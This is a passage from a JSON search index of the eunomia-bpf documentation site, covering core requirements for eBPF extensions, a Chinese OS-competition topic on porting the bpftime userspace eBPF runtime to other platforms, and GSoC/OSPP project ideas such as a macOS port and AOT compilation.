real-time, including attaching to or modifying system behavior dynamically.</li> <li>Control: Extensions should provide mechanisms for external sources to manage, adjust, and fine-tune behaviors, parameters, or policies.</li> <li>Integration Scope: Extensions must appropriately interact with system components, ranging from minimal interaction for lightweight subsystems to deep integration for more complex systems.</li> </ol>"},{"location":"others/miscellaneous/ebpf-usecases/#core-requirements-for-ebpf-extensions","title":"Core Requirements for eBPF Extensions","text":""},{"location":"others/miscellaneous/ebpf-usecases/#1-performance","title":"1. Performance","text":"<p>Extensions must operate efficiently to maintain or enhance system performance without introducing significant overhead.</p>"},{"location":"others/miscellaneous/ebpf-usecases/#2-security","title":"2. Security","text":"<p>Extensions should protect against vulnerabilities and ensure the integrity and confidentiality of the system.</p>"},{"location":"others/miscellaneous/ebpf-usecases/#3-expressiveness","title":"3. Expressiveness","text":"<p>Extensions need the capability to define and implement complex, detailed, and customizable logic or policies.</p>"},{"location":"others/miscellaneous/ebpf-usecases/#4-dynamic","title":"4. Dynamic","text":"<p>Extensions must be able to adjust to varying conditions, workloads, or requirements in real-time, including attaching to or modifying system behavior dynamically.</p>"},{"location":"others/miscellaneous/ebpf-usecases/#5-control","title":"5. Control","text":"<p>Extensions should provide mechanisms for external sources to manage, adjust, and fine-tune behaviors, parameters, or policies.</p>"},{"location":"others/miscellaneous/ebpf-usecases/#6-integration-scope","title":"6. Integration Scope","text":"<p>Extensions must appropriately interact with system components, ranging from minimal interaction for lightweight subsystems to deep integration for more complex systems.</p>"},{"location":"others/miscellaneous/ebpf-usecases/#summary-of-core-requirements-importance","title":"Summary of Core Requirements Importance","text":"Category Performance Security Expressiveness Dynamic Control Integration Scope 1. Networking High Medium High High High Minimal to Moderate 2. Profiling High Medium Medium Medium Medium Minimal 3. Tracing Medium Medium High High High Moderate 4. Security Medium High Medium High High Moderate to Deep 5. Storage and File High Medium High Medium Medium Moderate 6. Memory High Medium Medium High Medium Moderate 7. Scheduling High Medium High High High Deep 8. Device Drivers High Medium High High Medium Deep 9. Testing Medium Medium Medium High High Minimal to Moderate 10. Runtime Features High Medium High High High Moderate to Deep"},{"location":"others/miscellaneous/ebpf-usecases/#key-insights","title":"Key Insights","text":"<ol> <li>Performance is crucial for Networking, Profiling, High-Speed Data Processing, Scheduling, and Device Drivers, where efficiency and low overhead are essential.</li> <li>Security is paramount in Security, Access Control, and Patch Fixing, focusing on protecting against threats and vulnerabilities.</li> <li>Expressiveness allows for defining complex policies and logic, important across Networking, Tracing, Storage and File, and Scheduling.</li> <li>Dynamic capability is essential for Networking, Tracing, Security, Memory, and Runtime Features, enabling real-time adaptation.</li> <li>Control mechanisms are vital for Networking, Tracing, Security, Testing, and Runtime Features, facilitating dynamic management and adjustments.</li> <li>Integration Scope varies significantly, with Device Drivers and Scheduling requiring deep integration, while Networking and Profiling often need minimal to moderate interaction.</li> </ol>"},{"location":"others/miscellaneous/ebpf-usecases/#additional-considerations","title":"Additional Considerations","text":"<ul> <li>Integration Scope helps determine the level of interaction required between extensions and system components, ensuring that extensions are appropriately designed for their target use cases.</li> <li>Balancing Performance and Security is often critical, especially in high-impact areas like Networking and Scheduling.</li> <li>Expressiveness and Dynamic capabilities enable extensions to handle complex and evolving scenarios, making them more versatile and powerful.</li> <li>Control mechanisms ensure that extensions can be managed effectively, allowing for fine-tuning and adjustments as system requirements change.</li> </ul> <p>By adhering to these core requirements, designers and developers can create robust, efficient, and secure eBPF extensions tailored to their specific use cases.</p> <p>Share on  Share on </p>"},{"location":"others/miscellaneous/ebpf-userspace-port/","title":"\u5c06\u7528\u6237\u6001 eBPF \u6269\u5c55\u5230 MacOS\u3001Windows\u3001FreeBSD \u7b49\u66f4\u591a\u5e73\u53f0 - \u64cd\u4f5c\u7cfb\u7edf\u5927\u8d5b\u8d5b\u9898","text":""},{"location":"others/miscellaneous/ebpf-userspace-port/#_1","title":"\u9879\u76ee\u63cf\u8ff0","text":"<p>bpftime \u662f\u4e00\u4e2a\u7528\u6237\u7a7a\u95f4\u7684 eBPF \u8fd0\u884c\u65f6\uff0c\u53ef\u8ba9\u73b0\u6709\u7684 eBPF \u5e94\u7528\u7a0b\u5e8f\u76f4\u63a5\u5728\u975e\u7279\u6743\u7528\u6237\u7a7a\u95f4\u4e2d\u8fd0\u884c\uff0c\u4f7f\u7528\u76f8\u540c\u7684\u5e93\u548c\u5de5\u5177\u94fe\uff0c\u5e76\u4e14\u83b7\u53d6\u5230\u8ffd\u8e2a\u5206\u6790\u7684\u7ed3\u679c\u3002\u5b83\u4e3a eBPF \u63d0\u4f9b Uprobe \u548c Syscall tracepoint \u7b49\u8ffd\u8e2a\u70b9\uff0c\u6bd4\u5185\u6838 uprobe \u7684\u5f00\u9500\u964d\u4f4e\u7ea610\u500d\uff0c\u4e0d\u9700\u8981\u624b\u52a8\u7684\u4ee3\u7801\u63d2\u6869\u6216\u8fdb\u7a0b\u91cd\u542f\uff0c\u53ef\u4ee5\u5b9e\u73b0\u5bf9\u4e8e\u6e90\u4ee3\u7801\u548c\u7f16\u8bd1\u6d41\u7a0b\u7684\u65e0\u4fb5\u5165\u5f0f\u5206\u6790\u3002\u5b83\u4e5f\u53ef\u4ee5\u548c DPDK \u7b49\u7ed3\u5408\uff0c\u5728\u7528\u6237\u6001\u7f51\u7edc\u4e2d\u5b9e\u73b0 XDP \u7684\u529f\u80fd\uff0c\u5e76\u548c\u5185\u6838 XDP \u517c\u5bb9\u3002\u8fd0\u884c\u65f6\u5728\u7528\u6237\u7a7a\u95f4\u5171\u4eab\u5185\u5b58\u4e2d\u652f\u6301\u8fdb\u7a0b\u95f4\u7684 eBPF maps\uff0c\u4e5f\u517c\u5bb9\u5185\u6838\u7684 eBPF maps\uff0c\u53ef\u4ee5\u4e0e\u5185\u6838\u7684 eBPF \u57fa\u7840\u8bbe\u65bd\u65e0\u7f1d\u64cd\u4f5c\u3002\u5b83\u8fd8\u5305\u542b\u591a\u79cd\u67b6\u6784\u7684\u9ad8\u6027\u80fd eBPF LLVM JIT/AOT \u7f16\u8bd1\u5668\u3002</p> <p>bpftime \u73b0\u5728\u53ef\u4ee5\u8ba9 bpftrace \u548c bcc \u7b49\u5de5\u5177\uff0c\u4ee5\u53ca\u4e00\u4e9b\u5546\u4e1a eBPF \u7684\u53ef\u89c2\u6d4b\u6027\u7ec4\u4ef6\u5728\u7528\u6237\u6001\u8fd0\u884c\uff0c\u800c\u4e0d\u9700\u8981\u5185\u6838 eBPF \u652f\u6301\uff0c\u4e5f\u4e0d\u9700\u8981 root \u6743\u9650\uff0c\u8fd9\u4e5f\u4e3a\u5176\u4ed6\u975e Linux \u7cfb\u7edf\u3001\u4f4e\u7248\u672c\u5185\u6838\u3001\u975e\u7279\u6743\u5bb9\u5668\u73af\u5883\u4e0b\u4f7f\u7528 eBPF \u8fdb\u884c\u8ffd\u8e2a\u5206\u6790\u63d0\u4f9b\u4e86\u66f4\u591a\u53ef\u80fd\u6027\u3002\u76ee\u524d\u6211\u4eec\u4e3b\u8981\u5728\u9ad8\u7248\u672c Linux \u4e0a\u8fdb\u884c\u4e86\u6d4b\u8bd5\uff0c\u4f46\u6211\u4eec\u5e0c\u671b\u80fd\u591f\u628a\u5b83\u79fb\u690d\u5230\u5176\u4ed6\u5e73\u53f0\uff0c\u4f8b\u5982 FreeBSD\uff0cWindows\uff0cMacOS \u7b49\u7b49\uff0c\u6216\u8005\u4e00\u4e9b\u5d4c\u5165\u5f0f\u573a\u666f\uff0c\u8ba9\u66f4\u591a\u7684\u5e73\u53f0\u652f\u6301 eBPF \u751f\u6001\u3002</p>"},{"location":"others/miscellaneous/ebpf-userspace-port/#_2","title":"\u9884\u671f\u76ee\u6807","text":"<ol> <li>\u5728 FreeBSD\uff0cWindows\uff0cMacOS \u6216\u5176\u4ed6\u7cfb\u7edf\u5e73\u53f0\u4e0a\u79fb\u690d bpftime\uff0c\u6269\u5c55\u5176\u8de8\u5e73\u53f0\u7684\u80fd\u529b\uff0c\u5e76\u8ba9\u5176\u4ed6\u5e73\u53f0\u7684\u7528\u6237\u80fd\u591f\u5229\u7528 eBPF \u7684\u5f3a\u5927\u529f\u80fd\u5728\u4ed6\u4eec\u7684\u5f00\u53d1\u548c\u751f\u4ea7\u73af\u5883\u4e2d\u3002</li> <li>\u8ba9 <code>bpftime</code> \u4e0e\u5176\u4ed6 OS\u517c\u5bb9\uff0c\u786e\u4fdd\u6838\u5fc3\u529f\u80fd\u548c\u80fd\u529b\u5728\u8be5\u5e73\u53f0\u4e0a\u7684\u8fd0\u884c\u3002bpftime \u7684\u6838\u5fc3\u4e8c\u8fdb\u5236\u63d2\u6869\u3001\u52a8\u6001\u5e93\u8bf8\u5982\u7b49\u80fd\u529b\u4ec5\u4f9d\u8d56\u5171\u4eab\u5185\u5b58\u3001\u52a8\u6001\u5e93\uff0c\u5176\u4ed6\u53ef\u80fd\u7684\u6269\u5c55\u5305\u542b\u548c\u5185\u6838 eBPF \u517c\u5bb9\u3001ptrace \u6ce8\u5165\u8fd0\u884c\u4e2d\u7684\u8fdb\u7a0b\u7b49\uff0c\u8fd9\u4e9b\u80fd\u529b\u53ef\u4ee5\u6839\u636e\u4e0d\u540c\u5e73\u53f0\u7684\u7279\u6027\u8fdb\u884c\u9009\u62e9\u6027\u7684\u5b9e\u73b0\u3002</li> <li>\u76ee\u6807\u662f\u5728\u4e0d\u540c\u5e73\u53f0\u4e0a\u76f4\u63a5\u8fd0\u884c bcc \u548c bpftrace \u7b49\u5de5\u5177\uff0c\u6216\u8005\u5176\u4ed6\u5546\u4e1a eBPF \u7684\u53ef\u89c2\u6d4b\u6027\u7ec4\u4ef6\uff0c\u800c\u4e0d\u9700\u8981\u4fee\u6539\u5bf9\u5e94\u7684\u5185\u6838\u3002</li> </ol>"},{"location":"others/miscellaneous/ebpf-userspace-port/#_3","title":"\u7279\u5f81","text":"<p>\u9879\u76ee\u7684\u7279\u5f81\u5305\u62ec\uff1a</p> <ul> <li>\u517c\u5bb9\u6027\u548c\u96c6\u6210\uff1a\u8ba9 <code>bpftime</code> \u4e0e\u5176\u4ed6 OS \u517c\u5bb9\uff0c\u786e\u4fdd\u6838\u5fc3\u529f\u80fd\u548c\u80fd\u529b\u5728\u8be5\u5e73\u53f0\u4e0a\u7684\u8fd0\u884c\u3002</li> <li>\u8fd0\u884c\u5bf9\u5e94\u7684\u5de5\u4f5c\u8d1f\u8f7d\uff1a\u8ba9 <code>bpftime</code> \u5728\u5176\u4ed6\u5e73\u53f0\u4e0a\u8fd0\u884c bcc \u548c bpftrace \u7b49\u5de5\u5177\uff0c\u6216\u8005\u5176\u4ed6\u5546\u4e1a eBPF \u7684\u53ef\u89c2\u6d4b\u6027\u7ec4\u4ef6\uff0c\u83b7\u53d6\u5bf9\u5e94\u7684\u8f93\u51fa\u7ed3\u679c\uff0c\u800c\u4e0d\u9700\u8981\u4fee\u6539\u5bf9\u5e94\u7684\u5185\u6838\u3002</li> </ul>"},{"location":"others/miscellaneous/ebpf-userspace-port/#_4","title":"\u5df2\u6709\u53c2\u8003\u8d44\u6599","text":"<ul> <li>Linux Plumbers 23 \u6f14\u8bb2\uff1abpftime: Fast uprobes with user space BPF runtime</li> <li>bpftime</li> <li>Arxiv: bpftime: Fast uprobes with user space BPF runtime</li> <li>Issue: Try to run eBPF with bpftime on MacOS</li> </ul>"},{"location":"others/miscellaneous/ebpf-userspace-port/#_5","title":"\u8d5b\u9898\u5206\u7c7b","text":"<p>\u3010code:405\u30112.4.5 \u7cfb\u7edf\u8c03\u8bd5/\u652f\u6491\u5e93\u7684\u8bbe\u8ba1</p>"},{"location":"others/miscellaneous/ebpf-userspace-port/#_6","title":"\u53c2\u8d5b\u8981\u6c42","text":"<ul> <li>\u4ee5\u5c0f\u7ec4\u4e3a\u5355\u4f4d\u53c2\u8d5b\uff0c\u6700\u591a\u4e09\u4eba\u4e00\u4e2a\u5c0f\u7ec4\uff0c\u4e14\u5c0f\u7ec4\u6210\u5458\u662f\u6765\u81ea\u540c\u4e00\u6240\u9ad8\u6821\u7684\u672c\u79d1\u751f\u6216\u7814\u7a76\u751f</li> <li>\u5141\u8bb8\u5b66\u751f\u53c2\u52a0\u5927\u8d5b\u7684\u591a\u4e2a\u4e0d\u540c\u9898\u76ee\uff0c\u6700\u7ec8\u81ea\u5df1\u9009\u62e9\u4e00\u4e2a\u9898\u76ee\u53c2\u4e0e\u8bc4\u5956</li> <li>\u8bf7\u9075\u5faa\u201c2024\u5168\u56fd\u5927\u5b66\u751f\u64cd\u4f5c\u7cfb\u7edf\u6bd4\u8d5b\u201d\u7684\u7ae0\u7a0b\u548c\u6280\u672f\u65b9\u6848\u8981\u6c42</li> </ul>"},{"location":"others/miscellaneous/ebpf-userspace-port/#_7","title":"\u96be\u5ea6","text":"<p>\u4e2d\u7b49</p>"},{"location":"others/miscellaneous/ebpf-userspace-port/#license","title":"License","text":"<p>GPL-3.0 License</p>"},{"location":"others/miscellaneous/ebpf-userspace-port/#_8","title":"\u6240\u5c5e\u8d5b\u9053","text":"<p>2024\u5168\u56fd\u5927\u5b66\u751f\u64cd\u4f5c\u7cfb\u7edf\u6bd4\u8d5b\u7684\u201cOS\u529f\u80fd\u6311\u6218\u201d\u8d5b\u9053</p>"},{"location":"others/miscellaneous/ebpf-userspace-port/#_9","title":"\u9879\u76ee\u5bfc\u5e08","text":"<ul> <li>\u59d3\u540d\uff1a\u90d1\u6631\u7b19</li> <li>\u5355\u4f4d\uff1aeunomia-bpf \u5f00\u6e90\u793e\u533a</li> <li>github ID\uff1ahttps://github.com/yunwei37</li> <li>email\uff1ateam@eunomia.dev and yunwei356@gmail.com</li> </ul> <p>Share on  Share on </p>"},{"location":"others/miscellaneous/gsoc-ospp/","title":"GSOC - OSPP draft proposal","text":""},{"location":"others/miscellaneous/gsoc-ospp/#gsoc-2024","title":"GSOC 2024","text":"<p>Unleash eBPF Potential with our tools and runtimes</p> <p>Eunomia Lab is an innovative open-source organization dedicated to advancing the eBPF ecosystem. Our mission is to create and improve toolchains and runtimes that enhance the functionality and efficiency of eBPF, a revolutionary technology for running sandboxed programs within the Linux kernel without changing kernel source code or loading kernel modules. Our projects include: </p> <ul> <li>bpftime: A userspace eBPF runtime. It offers rapid uprobe 10x faster than kernel uprobes, and syscall hook capabilities. It's compatible with kernel eBPF and existing eBPF toolchains, and can be injected into any running process without restart or manual recompilation. It can work with kernel eBPF or the eBPF runtime in other userspace processes. </li> <li>Wasm-bpf: Cooprated with WaseEdge, we build the first user-space development library, toolchain, and runtime for general eBPF programs based on WebAssembly, allows lightweight Wasm sandboxes to deploy and control eBPF applications in k8s clusters. </li> <li>GPTtrace: The first tool generates eBPF programs and traces the Linux kernel through natural language. With our AI agents, it can produce correct eBPF programs on 80%, while a baseline of GPT-4 is 30%. </li> <li>eunomia-bpf: A tool to help developers build, distribute and run eBPF programs easier with JSON and WebAssembly OCI images </li> </ul> <p>Our commitment extends beyond tool development to education. We offer extensive resources for those looking to master eBPF, from beginners to advanced users. To discover more about our projects and educational materials, visit us at eunomia.dev.</p>"},{"location":"others/miscellaneous/gsoc-ospp/#ospp-24","title":"OSPP 24","text":"<p>eunomia-bpf \u662f\u4e00\u4e2a\u5f00\u6e90\u7ec4\u7ec7\uff0c\u81f4\u529b\u4e8e\u4e8e\u63a8\u52a8 eBPF \u751f\u6001\u7cfb\u7edf\u7684\u8fdb\u6b65\uff0c\u5e0c\u671b\u901a\u8fc7\u521b\u5efa\u548c\u6539\u5584\u5de5\u5177\u94fe\u53ca\u8fd0\u884c\u65f6\u6765\u63d0\u5347 eBPF \u6280\u672f\u7684\u529f\u80fd\u6027\u548c\u6548\u7387\uff0c\u8fd9\u4e00\u6280\u672f\u80fd\u5728\u4e0d\u4fee\u6539\u5185\u6838\u4ee3\u7801\u6216\u52a0\u8f7d\u6a21\u5757\u7684\u60c5\u51b5\u4e0b\uff0c\u5728 Linux \u5185\u6838\u4e2d\u8fd0\u884c\u6c99\u76d2\u5316\u7a0b\u5e8f\u3002</p> <p>\u6211\u4eec\u7684\u9879\u76ee\u5305\u62ec\uff1a</p> <ul> <li>bpftime\uff1a\u7528\u6237\u7a7a\u95f4 eBPF \u8fd0\u884c\u65f6\uff0c\u63d0\u4f9b\u6bd4\u5185\u6838\u5feb 10 \u500d\u7684 uprobe \u901f\u5ea6\uff0c\u652f\u6301 syscall \u94a9\u5b50\uff0c\u65e0\u9700\u91cd\u542f\u6216\u91cd\u65b0\u7f16\u8bd1\u5373\u53ef\u6ce8\u5165\u8fd0\u884c\u4e2d\u8fdb\u7a0b\u3002</li> <li>Wasm-bpf\uff1a\u4e0e WaseEdge \u5408\u4f5c\u5f00\u53d1\u7684\uff0c\u57fa\u4e8e WebAssembly \u7684 eBPF \u5e94\u7528\u5f00\u53d1\u5de5\u5177\u94fe\u548c\u8fd0\u884c\u65f6\uff0c\u4f7f\u5f97\u5728 k8s \u96c6\u7fa4\u4e2d\u90e8\u7f72\u8f7b\u91cf\u7ea7 Wasm \u6c99\u76d2\u6210\u4e3a\u53ef\u80fd\u3002</li> <li>GPTtrace\uff1a\u9996\u4e2a\u901a\u8fc7\u81ea\u7136\u8bed\u8a00\u751f\u6210 eBPF \u7a0b\u5e8f\u7684\u5de5\u5177\uff0c\u6210\u529f\u7387\u8fbe 80%\u3002</li> <li>eunomia-bpf framework\uff1a\u7b80\u5316 eBPF \u7a0b\u5e8f\u5f00\u53d1\u3001\u5206\u53d1\u548c\u8fd0\u884c\u6d41\u7a0b\u7684\u5de5\u5177\uff0c\u4f7f\u7528 JSON \u548c WebAssembly OCI \u955c\u50cf\u3002</li> <li>eunomia-bpf \u4e5f\u81f4\u529b\u4e8e\u63d0\u4f9b eBPF \u5b66\u4e60\u8d44\u6e90\u548c\u4e30\u5bcc\u7684\u6559\u7a0b\u3002\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u8bbf\u95ee eunomia.dev\u3002</li> </ul> <p>Share on  Share on </p>"},{"location":"others/miscellaneous/ideas/","title":"\u5f00\u6e90\u6d3b\u52a8\u7684\u53ef\u80fd\u60f3\u6cd5 - eunomia-bpf 2024","text":"<p>\u8fd9\u662f\u4e00\u4e9b\u5f00\u6e90\u6d3b\u52a8\u7684\u53ef\u80fd\u60f3\u6cd5\uff0c\u5982 GSOC(Google Summer of Code) \u6216 OSPP(\u5f00\u6e90\u8f6f\u4ef6\u4f9b\u5e94\u94fe\u70b9\u4eae\u8ba1\u5212)\u3002\u6211\u4eec\u7684\u9879\u76ee\u8bbe\u8ba1\u9002\u5e94\u4e8e\u4e0d\u540c\u6c34\u5e73\u7684\u4e13\u4e1a\u77e5\u8bc6\uff0c\u4ece\u5b66\u751f\u5230\u66f4\u9ad8\u7ea7\u7684\u5f00\u53d1\u8005\u3002</p> <p>\u8fd9\u4e5f\u662f\u6211\u4eec\u9879\u76ee\u8def\u7ebf\u56fe\u7684\u4e00\u90e8\u5206\uff0c\u5982\u679c\u4f60\u4e0d\u53c2\u52a0\u8fd9\u4e9b\u6d3b\u52a8\uff0c\u4f60\u4e5f\u53ef\u4ee5\u5e2e\u52a9\u6216\u5408\u4f5c\u8fd9\u4e9b\u60f3\u6cd5\uff01\u9700\u8981\u5e2e\u52a9\uff1f\u8bf7\u5728\u7535\u5b50\u90ae\u4ef6\u5217\u8868\u6216\u5728Discord \u9891\u9053\u8054\u7cfb\u3002</p>"},{"location":"others/miscellaneous/ideas/#bpftime","title":"bpftime","text":"<p>\u4e00\u4e2a\u7528\u6237\u7a7a\u95f4\u7684 eBPF \u8fd0\u884c\u65f6\uff0c\u53ef\u8ba9\u73b0\u6709\u7684 eBPF \u5e94\u7528\u7a0b\u5e8f\u5728\u975e\u7279\u6743\u7528\u6237\u7a7a\u95f4\u4e2d\u8fd0\u884c\uff0c\u4f7f\u7528\u76f8\u540c\u7684\u5e93\u548c\u5de5\u5177\u94fe\u3002\u5b83\u4e3a eBPF \u63d0\u4f9b Uprobe \u548c Syscall \u8ffd\u8e2a\u70b9\uff0c\u6bd4\u5185\u6838 uprobe \u7684\u6027\u80fd\u63d0\u9ad8\u5f88\u591a\uff0c\u800c\u4e14\u4e0d\u9700\u8981\u624b\u52a8\u7684\u4ee3\u7801\u63d2\u6869\u6216\u8fdb\u7a0b\u91cd\u542f\u3002\u8fd0\u884c\u65f6\u5728\u7528\u6237\u7a7a\u95f4\u5171\u4eab\u5185\u5b58\u4e2d\u652f\u6301\u8fdb\u7a0b\u95f4\u7684 eBPF \u6620\u5c04\uff0c\u4e5f\u517c\u5bb9\u5185\u6838\u7684 eBPF \u6620\u5c04\uff0c\u53ef\u4ee5\u4e0e\u5185\u6838\u7684 eBPF \u57fa\u7840\u8bbe\u65bd\u65e0\u7f1d\u64cd\u4f5c\u3002\u5b83\u8fd8\u5305\u542b\u591a\u79cd\u67b6\u6784\u7684\u9ad8\u6027\u80fd LLVM JIT\uff0c\u5916\u52a0\u4e00\u4e2a\u9488\u5bf9 x86 \u7684\u8f7b\u91cf\u7ea7 JIT \u548c\u4e00\u4e2a\u89e3\u91ca\u5668\u3002</p> <p>\u6b32\u4e86\u89e3\u66f4\u591a\u8be6\u60c5\uff0c\u8bf7\u53c2\u89c1\uff1a</p> <ul> <li>https://eunomia.dev/bpftime</li> <li>https://github.com/eunomia-bpf/bpftime</li> </ul>"},{"location":"others/miscellaneous/ideas/#bpftime-macos","title":"\u628a bpftime \u79fb\u690d\u5230 macOS","text":"<p>\u7531\u4e8e bpftime \u53ef\u4ee5\u5728\u7528\u6237\u7a7a\u95f4\u4e2d\u8fd0\u884c\u5e76\u4e14\u4e0d\u9700\u8981\u5185\u6838 eBPF\uff0c\u90a3\u4e3a\u4ec0\u4e48\u4e0d\u8ba9 macOS \u4e5f\u53ef\u4ee5\u4f7f\u7528 eBPF \u5462\uff1f</p> <p>\u8fd9\u4e2a\u9879\u76ee\u7684\u76ee\u6807\u662f\u628a <code>bpftime</code> \u79fb\u690d\u5230 macOS\uff0c\u6269\u5c55\u5176\u8de8\u5e73\u53f0\u7684\u80fd\u529b\uff0c\u5e76\u8ba9 macOS \u7528\u6237\u80fd\u591f\u5229\u7528 <code>eBPF</code> \u7684\u5f3a\u5927\u529f\u80fd\u5728\u4ed6\u4eec\u7684\u5f00\u53d1\u548c\u751f\u4ea7\u73af\u5883\u4e2d\u3002\u6709\u4e86 bpftime\uff0c\u73b0\u5728\u4f60\u53ef\u80fd\u80fd\u5728 macOS \u4e0a\u8fd0\u884c bcc \u548c bpftrace \u5de5\u5177\uff01</p> <ul> <li>\u65f6\u95f4\uff1a~175 \u5c0f\u65f6</li> <li>\u96be\u5ea6\u7b49\u7ea7\uff1a\u4e2d\u7b49</li> <li>\u5bfc\u5e08\uff1aYusheng Zheng (yunwei356@gmail.com) \u548c Yuxi Huang (Yuxi4096@gmail.com)</li> </ul>"},{"location":"others/miscellaneous/ideas/#macos-ebpf","title":"\u5b9e\u73b0\u5728 macOS \u4e0a\u542f\u7528 eBPF \u7684\u76ee\u6807","text":"<ol> <li>\u517c\u5bb9\u6027\u548c\u96c6\u6210\uff1a\u8ba9 <code>bpftime</code> \u4e0e macOS \u517c\u5bb9\uff0c\u786e\u4fdd\u6838\u5fc3\u529f\u80fd\u548c\u80fd\u529b\u5728\u8be5\u5e73\u53f0\u4e0a\u7684\u8fd0\u884c\u3002</li> <li>\u6027\u80fd\u4f18\u5316\uff1a\u8c03\u6574 <code>bpftime</code> \u5728 macOS \u4e0a\u7684\u6027\u80fd\uff0c\u4e13\u6ce8\u4e8e\u4f18\u5316\u9002\u7528\u4e8e macOS \u67b6\u6784\u7684 LLVM JIT \u548c\u8f7b\u91cf\u7ea7 JIT \u7684\u6027\u80fd\u3002</li> <li>\u4e0e macOS \u751f\u6001\u7cfb\u7edf\u65e0\u7f1d\u96c6\u6210\uff1a\u786e\u4fdd <code>bpftime</code> \u80fd\u4e0e macOS \u73af\u5883\u5e73\u6ed1\u96c6\u6210\uff0c\u4e3a macOS eBPF \u7528\u6237\u63d0\u4f9b\u4e00\u79cd\u539f\u751f\u548c\u9ad8\u6548\u7684\u5f00\u53d1\u4f53\u9a8c\u3002</li> <li>\u6587\u6863\u548c\u6559\u7a0b\uff1a\u5f00\u53d1\u4e13\u4e3a macOS \u7528\u6237\u8bbe\u8ba1\u7684\u6587\u6863\u548c\u6559\u7a0b\uff0c\u65b9\u4fbf\u4ed6\u4eec\u5728\u8be5\u5e73\u53f0\u4e0a\u5bb9\u6613\u5730\u91c7\u7528\u548c\u4f7f\u7528 <code>bpftime</code>\u3002</li> </ol>"},{"location":"others/miscellaneous/ideas/#_1","title":"\u9884\u671f\u7684\u6210\u679c","text":"<ul> <li>\u4e00\u4e2a\u529f\u80fd\u6b63\u5e38\u7684 <code>bpftime</code> \u5728 macOS \u4e0a\u7684\u79fb\u690d\uff0c\u6838\u5fc3\u529f\u80fd\u8fd0\u884c\u6b63\u5e38\u3002</li> <li>\u60a8\u5e94\u8be5\u80fd\u591f\u5728 MacOS \u4e0a\u8fd0\u884c bpftrace \u548c bcc \u5de5\u5177\u3002</li> <li>\u4f7f\u7528 <code>bpftime</code> \u5728 macOS \u4e0a\u7684\u6587\u6863\u548c\u6307\u5357\u3002</li> </ul>"},{"location":"others/miscellaneous/ideas/#_2","title":"\u9700\u8981\u7684\u6280\u80fd","text":"<ul> <li>\u7cbe\u901a C/C++ \u548c\u7cfb\u7edf\u7f16\u7a0b\u3002</li> <li>\u719f\u6089 macOS \u5f00\u53d1\u73af\u5883\u548c\u5de5\u5177\u3002</li> <li>\u5bf9 eBPF \u53ca\u5176\u5e94\u7528\u7684\u7406\u89e3\u3002</li> </ul>"},{"location":"others/miscellaneous/ideas/#_3","title":"\u53c2\u8003\u53ca\u95ee\u9898","text":"<ul> <li>\u95ee\u9898\u548c\u4e00\u4e9b\u521d\u59cb\u8ba8\u8bba\uff1ahttps://github.com/eunomia-bpf/bpftime/issues</li> <li>\u4ee5\u524d\u7684\u4e00\u4e9b\u52aa\u529b\uff1a\u5728 arm \u4e0a\u542f\u7528 bpftime</li> </ul>"},{"location":"others/miscellaneous/ideas/#ebpf-aot","title":"\u4e3a\u8f7b\u91cf\u7ea7\u5bb9\u5668\u63d0\u4f9b\u7528\u6237\u7a7a\u95f4\u7684 eBPF \u7684 AOT \u7f16\u8bd1","text":""},{"location":"others/miscellaneous/ideas/#_4","title":"\u6982\u8ff0","text":"<p>\u5728\u4e91\u539f\u751f\u5e94\u7528\u3001\u7269\u8054\u7f51\u548c\u5d4c\u5165\u5f0f\u7cfb\u7edf\u7684\u53d1\u5c55\u4e16\u754c\u4e2d\uff0c\u5bf9\u6709\u6548\u3001\u5b89\u5168\u3001\u6ce8\u610f\u8d44\u6e90\u7684\u8ba1\u7b97\u65b9\u6848\u7684\u9700\u6c42\u6b63\u5728\u589e\u52a0\u3002\u6211\u4eec\u7684\u9879\u76ee\u5173\u6ce8\u7684\u662f\u5f00\u53d1\u4e00\u4e2a\u7528\u6237\u7a7a\u95f4\u7684 eBPF (\u6269\u5c55\u7684\u4f2f\u514b\u5229\u6570\u636e\u5305\u8fc7\u6ee4\u5668) \u4e0e AOT (\u5148\u4e8e\u65f6\u95f4) \u7f16\u8bd1\u3002\u8fd9\u4e2a\u9879\u76ee\u7684\u76ee\u6807\u662f\u521b\u5efa\u4e00\u4e2a\u8f7b\u91cf\u7ea7\u7684\u3001\u4e8b\u4ef6\u9a71\u52a8\u7684\u8ba1\u7b97\u6a21\u578b\uff0c\u4ee5\u6ee1\u8db3\u5d4c\u5165\u5f0f\u548c\u8d44\u6e90\u53d7\u9650\u73af\u5883\u7684\u72ec\u7279\u9700\u6c42\u3002</p> <p>\u76f8\u6bd4\u4e8e\u5176\u4ed6\u65b9\u6848\uff0c eBPF AOT\u53ef\u4ee5\u5e26\u6765\u7684\u4e3b\u8981\u533a\u522b\u662f\uff0c\u5b83\u53ef\u4ee5\u5e2e\u52a9\u6784\u5efa\u4e00\u4e2a\u53ef\u9a8c\u8bc1\u548c\u5b89\u5168\u7684\u8fd0\u884c\u65f6\u73af\u5883\uff0c\u5e76\u53ef\u4ee5\u8db3\u591f\u8f7b\u91cf\u548c\u9ad8\u6548\uff0c\u4ee5\u4fbf\u5728\u5d4c\u5165\u5f0f\u8bbe\u5907\u4e0a\u8fd0\u884c\u3002</p> <p>\u6301\u7eed\u548c\u96be\u5ea6\u7b49\u7ea7</p> <ul> <li>\u9884\u671f\u6301\u7eed\u65f6\u95f4\uff1a~175 \u5c0f\u65f6</li> <li>\u96be\u5ea6\u7b49\u7ea7\uff1a\u4e2d\u7b49</li> <li>\u5bfc\u5e08\uff1aTong Yu (yt.xyxx@gmail.com), Yusheng Zheng (yunwei356@gmail.com)</li> </ul> <p>bpftime \u5df2\u7ecf\u6709\u4e86\u4e00\u4e2a AOT \u7f16\u8bd1\u5668\uff0c\u6211\u4eec\u9700\u8981\u8fdb\u884c\u66f4\u591a\u7684\u5de5\u4f5c\u4ee5\u4f7f\u5176\u80fd\u5728\u5d4c\u5165\u5f0f\u8bbe\u5907\u4e0a\u8fd0\u884c\u6216\u8005\u4f5c\u4e3a\u63d2\u4ef6\u8fd0\u884c\u3002</p>"},{"location":"others/miscellaneous/ideas/#_5","title":"\u76ee\u6807\u548c\u4efb\u52a1","text":"<ol> <li>\u5f00\u53d1\u7528\u6237\u7a7a\u95f4 eBPF AOT \u7f16\u8bd1\uff1aAOT \u7f16\u8bd1\u5668\u5e94\u8be5\u80fd\u591f\u5f88\u597d\u5730\u4e0e helpers\u3001ufuncs maps \u7b49 eBPF \u7684\u5176\u5b83\u7279\u6027\u4e00\u8d77\u5de5\u4f5c\u3002\u76ee\u524d\u6709\u4e00\u4e2a AOT 